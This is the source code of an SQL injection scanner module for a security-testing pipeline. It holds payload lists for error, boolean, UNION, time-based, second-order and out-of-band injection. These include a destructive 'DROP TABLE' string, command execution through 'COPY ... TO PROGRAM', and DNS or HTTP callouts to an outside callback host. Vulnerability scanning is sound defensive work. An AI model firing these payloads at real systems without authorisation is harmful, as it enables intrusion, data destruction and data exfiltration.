"""SQL injection scanner — first-pass pure-Python detection.

Four injection techniques: Boolean, Error-based, UNION, Time-based.
Measures baseline response time before time-based probes.
"""

from __future__ import annotations

import asyncio
import re
import time
from typing import TYPE_CHECKING
from urllib.parse import parse_qs, urlencode, urlparse, urlunparse

from network_pipeline.scanners import Scanner, register_scanner
from network_pipeline.scanners._common import ScanResult, ScanFinding

if TYPE_CHECKING:
    from network_pipeline.tools.runtime import HTTPClient

# DB error patterns (error-based detection)
_ERROR_PATTERNS = [
    (re.compile(r"sql syntax|mysql_fetch|ORA-\d+|pg_query|sqlite.*error", re.I), "MySQL/Generic"),
    (re.compile(r"Microsoft OLE DB Provider for SQL Server|Unclosed quotation mark", re.I), "MSSQL"),
    (re.compile(r"ora-\d{5}", re.I), "Oracle"),
    (re.compile(r"sqlite3\.(OperationalError|ProgrammingError)", re.I), "SQLite"),
    (re.compile(r"syntax error at or near|pg_exec", re.I), "PostgreSQL"),
]

# Error-based probe (expanded)
_ERROR_PAYLOADS = [
    "'", "\"", "\\", "1'", "1\"", "1)", "1\")", "'))",
    "%27", "%22",  # url-encoded
    "1' OR 1=CAST('a' AS int)--",  # cast-based DBMS error
    "1' AND extractvalue(1, concat(0x7e, version()))--",  # MySQL XPath error
    "1' AND 1=convert(int, @@version)--",  # MSSQL convert error
]

# Boolean-based probes: (true_payload, false_payload). Expanded set.
_BOOL_PAIRS = [
    ("1 AND 1=1", "1 AND 1=2"),
    ("' OR '1'='1", "' OR '1'='2"),
    ("1' AND '1'='1", "1' AND '1'='2"),
    ("1) AND (1=1)--", "1) AND (1=2)--"),
    ("1\" AND \"1\"=\"1", "1\" AND \"1\"=\"2"),
    # OR-based bypass attempts
    ("1' OR 1=1--", "1' OR 1=2--"),
    ("1 OR 1=1#", "1 OR 1=2#"),
    # Bracket variants
    ("(1)=(1)", "(1)=(2)"),
    # Nested CAST
    ("1 AND CAST(1 AS int)=1", "1 AND CAST(1 AS int)=2"),
]

# UNION probes — detect column count (1-12, broader than before).
# Each payload is tagged with the column count we're guessing.
_UNION_PAYLOADS: list[tuple[int, str]] = []
for _n in range(1, 13):
    _nulls = ",".join(["NULL"] * _n)
    _UNION_PAYLOADS.extend([
        (_n, f"' UNION SELECT {_nulls}--"),
        (_n, f"' UNION SELECT {_nulls}#"),
        (_n, f"') UNION SELECT {_nulls}--"),
        (_n, f"\" UNION SELECT {_nulls}--"),
    ])

# Once column count is known, swap one NULL for a probe string that we'll
# look for in the response body — confirms which column is reflected.
_UNION_REFLECT_CANARY = "0xUN10NPR0BE9999"

# Time-based payloads (target: MySQL, PostgreSQL, MSSQL, SQLite, Oracle).
_TIME_PAYLOADS = [
    ("'; WAITFOR DELAY '0:0:5'--", 5.0, "MSSQL"),
    ("'; SELECT SLEEP(5)--", 5.0, "MySQL"),
    ("' AND SLEEP(5)--", 5.0, "MySQL"),
    ("'; SELECT pg_sleep(5)--", 5.0, "PostgreSQL"),
    ("' AND pg_sleep(5)--", 5.0, "PostgreSQL"),
    ("'; BEGIN DBMS_LOCK.SLEEP(5); END;--", 5.0, "Oracle"),
    ("'; SELECT randomblob(100000000)--", 5.0, "SQLite"),
    # Heavy-blind chain (5x worse than baseline guarantees signal)
    ("' AND IF(1=1, BENCHMARK(5000000, MD5(1)), 0)--", 5.0, "MySQL-benchmark"),
]

# Second-order SQLi probe: store a payload, then read it back from a
# follow-up endpoint. The scanner doesn't know the read-back URL so we
# emit findings at "probable" if the original endpoint accepts the
# payload without rejection (status flip from 4xx -> 2xx).
_SECOND_ORDER_PAYLOADS = [
    "Robert'); DROP TABLE Students;--",  # classic Bobby Tables
    "admin'--",
    "admin'/*",
    "' OR 1=1--",
    "1';INSERT INTO logs VALUES('canary');--",
]

# Out-of-band SQLi via DNS exfil (when OAST is configured). Payload:
# resolve a unique callback host from inside the SQL engine.
def _oob_payloads(oast_host: str) -> list[str]:
    return [
        # MySQL via load_file/UDF
        f"' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\', database(), '.{oast_host}\\\\a'))--",
        # MSSQL xp_dirtree
        f"'; EXEC master..xp_dirtree '\\\\{oast_host}\\\\a'--",
        # PostgreSQL COPY ... PROGRAM
        f"'; COPY (SELECT '') TO PROGRAM 'nslookup {oast_host}'--",
        # Oracle UTL_HTTP
        f"' || (SELECT UTL_HTTP.REQUEST('http://{oast_host}/') FROM dual)--",
    ]


_TIME_DELTA_THRESHOLD = 4.0  # seconds — must beat baseline by this much
_BASELINE_REQUESTS = 3
_CONCURRENCY = 5


@register_scanner
class SQLiScanner(Scanner):
    name = "sqli_scan"
    requires_libs = ()
    opsec_min = "loud"
    loud_level = "medium"

    def __init__(self, http_client: "HTTPClient") -> None:
        self._http = http_client

    async def scan(
        self,
        target_url: str,
        params: list[str] | None = None,
    ) -> ScanResult:
        """Scan for SQL injection in URL parameters."""
        parsed = urlparse(target_url)
        existing_params = list(parse_qs(parsed.query).keys())
        all_params = list(dict.fromkeys((params or []) + existing_params))

        if not all_params:
            return ScanResult(
                scanner=self.name, target=target_url, success=False,
                error="no parameters to test",
            )

        findings: list[ScanFinding] = []
        sem = asyncio.Semaphore(_CONCURRENCY)

        for param in all_params:
            # 1. Error-based
            err_finding = await self._error_based(target_url, param, sem)
            if err_finding:
                findings.append(err_finding)
                # Don't continue — keep probing for richer evidence
                # (UNION column count, OOB) so the report is more useful.

            # 2. Boolean-based
            bool_finding = await self._boolean_based(target_url, param, sem)
            if bool_finding:
                findings.append(bool_finding)

            # 3. UNION-based (column-count discovery + reflection canary)
            union_finding = await self._union_based(target_url, param, sem)
            if union_finding:
                findings.append(union_finding)

            # 4. Time-based — always probe, even if error/bool already hit;
            # confirms exploitability + identifies DB engine.
            time_finding = await self._time_based(target_url, param, sem)
            if time_finding:
                findings.append(time_finding)

            # 5. Second-order — store-then-read pattern; emits "probable"
            # finding when payload is accepted without rejection.
            so_finding = await self._second_order(target_url, param, sem)
            if so_finding:
                findings.append(so_finding)

            # 6. Out-of-band (DNS exfil) — only if OAST is configured.
            oob_finding = await self._oob_dns(target_url, param, sem)
            if oob_finding:
                findings.append(oob_finding)

        return ScanResult(
            scanner=self.name,
            target=target_url,
            success=True,
            data={
                "params_tested": all_params,
                "findings": len(findings),
                "techniques_run": [
                    "error", "boolean", "union", "time",
                    "second_order", "oob_dns",
                ],
            },
            findings=findings,
            raw_text=_format_sqli(target_url, findings, all_params),
        )

    # ── New techniques ─────────────────────────────────────────────

    async def _union_based(
        self, url: str, param: str, sem: asyncio.Semaphore,
    ) -> ScanFinding | None:
        """UNION-based: walk col counts 1..12; on success record column count."""
        async with sem:
            # First, baseline body length so we can detect injection-induced delta
            base = await self._http.get(url, scanner_tool=self.name)
            base_len = len(base.text) if base else 0
            for cols, payload in _UNION_PAYLOADS:
                probe_url = _inject_param(url, param, payload)
                r = await self._http.get(probe_url, scanner_tool=self.name)
                if r is None:
                    continue
                # Signal: response went 4xx -> 2xx OR body length jumped >25%
                if r.status_code == 200 and base_len > 0:
                    delta = abs(len(r.text) - base_len) / max(base_len, 1)
                    # Reflect-canary check
                    canary_pl = payload.replace("NULL", f"'{_UNION_REFLECT_CANARY}'", 1)
                    canary_url = _inject_param(url, param, canary_pl)
                    rc = await self._http.get(canary_url, scanner_tool=self.name)
                    canary_in_body = (
                        rc is not None and _UNION_REFLECT_CANARY in (rc.text or "")
                    )
                    if canary_in_body:
                        return ScanFinding(
                            vuln_class="sqli-union-based",
                            title=(
                                f"SQL Injection (UNION-based) in parameter "
                                f"'{param}' — {cols} columns reflected"
                            ),
                            severity="high",
                            affected_target=url,
                            affected_param=param,
                            description=(
                                f"UNION-injected canary {_UNION_REFLECT_CANARY!r} "
                                f"appeared in response body via {cols}-column "
                                f"UNION SELECT. Adversaries dump arbitrary "
                                f"tables (information_schema, users, secrets) "
                                "from this entry point."
                            ),
                            cwe=["CWE-89"],
                            mitre=["T1190"],
                            remediation="Use parameterised queries.",
                            confidence="verified",
                            extra={"columns": cols, "payload": payload},
                        )
                    if delta > 0.25:
                        return ScanFinding(
                            vuln_class="sqli-union-suspect",
                            title=(
                                f"SQL Injection (UNION-suspect) in '{param}' "
                                f"— {cols}-col probe altered response"
                            ),
                            severity="medium",
                            affected_target=url,
                            affected_param=param,
                            description=(
                                f"{cols}-column UNION probe changed body length "
                                f"by {delta:.1%}. Likely SQLi pending canary "
                                "confirmation."
                            ),
                            cwe=["CWE-89"],
                            confidence="probable",
                            extra={"columns": cols, "delta": delta},
                        )
        return None

    async def _second_order(
        self, url: str, param: str, sem: asyncio.Semaphore,
    ) -> ScanFinding | None:
        """Detect when the param accepts known second-order payloads."""
        async with sem:
            base = await self._http.get(url, scanner_tool=self.name)
            base_status = base.status_code if base else 0
            for payload in _SECOND_ORDER_PAYLOADS:
                probe_url = _inject_param(url, param, payload)
                r = await self._http.get(probe_url, scanner_tool=self.name)
                if r is None:
                    continue
                # Signal: payload was *accepted* (no 4xx). True confirmation
                # would require a follow-up read endpoint we don't know.
                if base_status >= 400 and 200 <= r.status_code < 300:
                    return ScanFinding(
                        vuln_class="sqli-second-order-suspect",
                        title=(
                            f"Second-order SQLi suspect: '{param}' accepts "
                            "DROP/INSERT-style payload"
                        ),
                        severity="medium",
                        affected_target=url,
                        affected_param=param,
                        description=(
                            f"Baseline returned {base_status} but payload "
                            f"{payload!r} was accepted with status "
                            f"{r.status_code}. If this value is later "
                            "interpolated into a SQL query (e.g. on profile "
                            "view, audit log read) it will execute."
                        ),
                        cwe=["CWE-89"],
                        confidence="probable",
                        extra={"payload": payload},
                    )
        return None

    async def _oob_dns(
        self, url: str, param: str, sem: asyncio.Semaphore,
    ) -> ScanFinding | None:
        """Out-of-band SQLi via DNS callback through the OAST server."""
        try:
            from network_pipeline.tools.oast import get_current
            oast = get_current()
        except Exception:
            return None
        if oast is None or not getattr(oast, "enabled", False):
            return None
        token_id = oast.token().split(".", 1)[0]  # 16-char id
        oast_host = oast.token()  # full host
        async with sem:
            for payload in _oob_payloads(oast_host):
                probe_url = _inject_param(url, param, payload)
                await self._http.get(probe_url, scanner_tool=self.name)
            # Wait briefly for any of the payloads to phone home
            hit = await oast.wait_for(token_id, timeout=12.0)
        if hit is None:
            return None
        return ScanFinding(
            vuln_class="sqli-oob-dns",
            title=f"Out-of-band SQLi via DNS in parameter '{param}'",
            severity="critical",
            affected_target=url,
            affected_param=param,
            description=(
                f"OAST callback received from {hit.remote_addr} after SQL "
                "OOB payload injection. The DB engine resolved an attacker-"
                "controlled hostname, proving full SQLi with data-exfil "
                "capability via DNS."
            ),
            cwe=["CWE-89", "CWE-918"],
            mitre=["T1190", "T1071.004"],
            confidence="verified",
            extra={"oast_remote_addr": hit.remote_addr},
        )

    async def _error_based(
        self, url: str, param: str, sem: asyncio.Semaphore
    ) -> ScanFinding | None:
        async with sem:
            for payload in _ERROR_PAYLOADS:
                probe_url = _inject_param(url, param, payload)
                resp = await self._http.get(probe_url, scanner_tool=self.name)
                if resp is None:
                    continue
                for pat, db_type in _ERROR_PATTERNS:
                    if pat.search(resp.text):
                        return ScanFinding(
                            vuln_class="sqli-error-based",
                            title=f"SQL Injection (error-based) in parameter '{param}'",
                            severity="high",
                            affected_target=url,
                            affected_param=param,
                            description=(
                                f"Error-based SQLi detected in ?{param}= "
                                f"(db: {db_type}). Payload: {payload!r}"
                            ),
                            cwe=["CWE-89"],
                            mitre=["T1190"],
                            remediation="Use parameterised queries / prepared statements.",
                            confidence="verified",
                        )
        return None

    async def _boolean_based(
        self, url: str, param: str, sem: asyncio.Semaphore
    ) -> ScanFinding | None:
        async with sem:
            for true_pay, false_pay in _BOOL_PAIRS:
                true_url = _inject_param(url, param, true_pay)
                false_url = _inject_param(url, param, false_pay)
                r_true = await self._http.get(true_url, scanner_tool=self.name)
                r_false = await self._http.get(false_url, scanner_tool=self.name)
                if r_true is None or r_false is None:
                    continue
                if r_true.status_code != r_false.status_code:
                    return _bool_finding(url, param, true_pay, false_pay)
                len_diff = abs(len(r_true.content) - len(r_false.content))
                if len_diff > 50:
                    return _bool_finding(url, param, true_pay, false_pay)
        return None

    async def _time_based(
        self, url: str, param: str, sem: asyncio.Semaphore
    ) -> ScanFinding | None:
        # Measure baseline
        baseline = await _measure_baseline(self._http, url, param, _BASELINE_REQUESTS)
        if baseline is None:
            return None

        async with sem:
            for payload, expected_delay, db_type in _TIME_PAYLOADS:
                probe_url = _inject_param(url, param, payload)
                t0 = time.monotonic()
                resp = await self._http.get(probe_url, scanner_tool=self.name)
                elapsed = time.monotonic() - t0
                if resp is None:
                    continue
                delta = elapsed - baseline
                if delta >= _TIME_DELTA_THRESHOLD:
                    return ScanFinding(
                        vuln_class="sqli-time-based",
                        title=f"SQL Injection (time-based) in parameter '{param}'",
                        severity="high",
                        affected_target=url,
                        affected_param=param,
                        description=(
                            f"Time-based SQLi: baseline={baseline:.2f}s, "
                            f"probe={elapsed:.2f}s (Δ={delta:.2f}s), "
                            f"db={db_type}, payload={payload!r}"
                        ),
                        cwe=["CWE-89"],
                        mitre=["T1190"],
                        remediation="Use parameterised queries / prepared statements.",
                        confidence="probable",
                    )
        return None


async def _measure_baseline(
    http: "HTTPClient", url: str, param: str, n: int
) -> float | None:
    """Average response time over n clean requests to establish baseline."""
    times: list[float] = []
    for _ in range(n):
        t0 = time.monotonic()
        resp = await http.get(_inject_param(url, param, "1"), scanner_tool="sqli_scan")
        elapsed = time.monotonic() - t0
        if resp is not None:
            times.append(elapsed)
    return sum(times) / len(times) if times else None


def _inject_param(url: str, param: str, value: str) -> str:
    parsed = urlparse(url)
    qs = parse_qs(parsed.query, keep_blank_values=True)
    qs[param] = [value]
    return urlunparse(parsed._replace(query=urlencode(qs, doseq=True)))


def _bool_finding(url: str, param: str, t: str, f: str) -> ScanFinding:
    return ScanFinding(
        vuln_class="sqli-boolean-based",
        title=f"SQL Injection (boolean-based) in parameter '{param}'",
        severity="high",
        affected_target=url,
        affected_param=param,
        description=(
            f"Boolean-based SQLi: true_payload={t!r} vs false_payload={f!r} "
            f"produced different responses."
        ),
        cwe=["CWE-89"],
        mitre=["T1190"],
        remediation="Use parameterised queries / prepared statements.",
        confidence="probable",
    )


def _format_sqli(url: str, findings: list[ScanFinding], params: list[str]) -> str:
    lines = [f"SQLi scan on {url} ({len(params)} params):"]
    if findings:
        for f in findings:
            lines.append(f"  VULN [{f.severity}] {f.vuln_class}: {f.affected_param}")
    else:
        lines.append("  No SQLi found.")
    return "\n".join(lines)
